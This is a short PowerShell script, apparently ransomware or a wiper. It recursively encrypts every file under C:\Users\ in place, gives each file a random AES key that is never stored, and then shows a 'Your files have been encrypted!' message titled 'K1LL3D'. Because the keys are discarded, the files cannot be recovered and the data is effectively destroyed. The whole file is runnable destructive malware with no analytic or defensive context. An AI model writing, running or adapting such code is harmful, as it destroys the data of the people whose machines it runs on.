function Encrypt-FilesAES {
    param (
        [string]$directoryPath
    )

    $files = Get-ChildItem -Path $directoryPath -File

    foreach ($file in $files) {
        $key = Generate-RandomKey -keyLength 16

        $aes = New-Object Security.Cryptography.AesCryptoServiceProvider
        $aes.Key = $key
        $aes.IV = $key

        $encryptor = $aes.CreateEncryptor()

        $fileContent = [System.IO.File]::ReadAllBytes($file.FullName)

        $outputStream = [System.IO.File]::OpenWrite($file.FullName)
        $cryptoStream = New-Object Security.Cryptography.CryptoStream($outputStream, $encryptor, "Write")

        $cryptoStream.Write($fileContent, 0, $fileContent.Length)

        $cryptoStream.Close()
        $outputStream.Close()
    }

    $directories = Get-ChildItem -Path $directoryPath -Directory
    foreach ($subdir in $directories) {
        Encrypt-FilesAES -directoryPath $subdir.FullName
    }
}

function Generate-RandomKey {
    param (
        [int]$keyLength
    )

    $randomKey = New-Object Byte[] $keyLength
    [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($randomKey)

    return $randomKey
}

function MessageBox_Create {
    param(
        [string]$Message,
        [string]$Title
    )

    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.MessageBox]::Show($Message, $Title, [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)

    return $null
}

function Main {
    Encrypt-FilesAES -directoryPath "C:\Users\"

    MessageBox_Create -Message "Your files have been encrypted!" -Title "K1LL3D"

    return $null
}

Main
